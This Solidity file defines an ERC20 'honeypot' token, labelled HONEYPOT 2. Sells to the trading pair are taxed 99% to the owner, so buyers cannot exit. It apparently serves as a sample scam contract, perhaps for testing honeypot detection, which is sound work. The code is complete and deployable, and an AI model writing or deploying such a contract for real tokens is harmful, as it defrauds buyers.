// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "./Base.sol";

/// @notice HONEYPOT 2 — 99% sell tax. Buys are untaxed, but any sell (transfer
/// TO the pair) keeps 99% of the tokens: 99% goes to the owner, 1% to the buyer
/// of the other side. A seller always loses ~everything.
contract HoneyTax99 is ERC20Base {
    address public owner;
    address public pair;

    constructor(address _pair) ERC20Base("HoneyTrap Tax99", "HTAX", 1_000_000 * 1e18) {
        owner = msg.sender;
        pair = _pair;
    }

    function _transfer(address from, address to, uint256 value) internal override {
        if (to == pair && from != owner) {
            uint256 tax = (value * 99) / 100;
            super._transfer(from, owner, tax);
            super._transfer(from, to, value - tax);
        } else {
            super._transfer(from, to, value);
        }
    }
}
